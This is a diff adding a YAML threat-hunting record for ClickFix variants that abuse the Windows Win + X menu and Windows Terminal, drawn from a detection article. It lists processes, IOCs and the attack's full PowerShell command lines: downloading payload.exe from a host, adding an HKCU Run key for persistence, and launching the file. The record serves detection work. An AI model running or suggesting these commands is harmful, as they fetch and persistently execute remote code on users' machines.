@@ -1,0 +1,50 @@
+title: Hunting ClickFix Win + X Variants
+description: A focus on variants of ClickFix that leverage the Windows Power User
+  Menu (Win + X) and user-driven Terminal launches to paste and execute commands.
+attribution: ''
+malware_families: []
+cves: []
+ttps:
+  processes:
+  - wt.exe
+  - WindowsTerminal.exe
+  - powershell.exe
+  - pwsh.exe
+  command_lines:
+  - wt -w 0 nt powershell -NoProfile -Command "Invoke-WebRequest http://192.168.50.186/payload.exe
+    -OutFile $env:TEMP\payload.exe" ; wt -w 0 nt powershell -NoProfile -Command "New-ItemProperty
+    -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'PayloadTest'
+    -Value $env:TEMP\payload.exe -PropertyType String -Force" ; wt -w 0 nt powershell
+    -NoProfile -Command "Start-Process $env:TEMP\payload.exe"
+  - Invoke-WebRequest http://192.168.50.186/payload.exe -OutFile $env:TEMP\payload.exe
+  - New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name
+    'PayloadTest' -Value $env:TEMP\payload.exe -PropertyType String -Force
+  - Start-Process $env:TEMP\payload.exe
+  powershell:
+  - Invoke-WebRequest http://192.168.50.186/payload.exe -OutFile $env:TEMP\payload.exe
+  - New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name
+    'PayloadTest' -Value $env:TEMP\payload.exe -PropertyType String -Force
+  - Start-Process $env:TEMP\payload.exe
+  scripts: []
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - powershell.exe -> 192.168.50[.]186:80
+  file_activity:
+  - $env:TEMP\payload.exe
+  persistence:
+  - Registry Run key (HKCU) pointing to $env:TEMP\payload.exe
+  process_relations:
+  - explorer.exe -> wt.exe
+  - wt.exe -> WindowsTerminal.exe
+  - WindowsTerminal.exe -> powershell.exe
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains: []
+  urls:
+  - hxxp://192.168.50[.]186/payload.exe
+authors: []
+reference: https://detect.fyi/hunting-clickfix-win-x-variants-ff06e4c62bd9?source=rss----d5fd8f494f6a---4
+date_of_publication: May 08, 2026
+file_creation_date: May 09, 2026
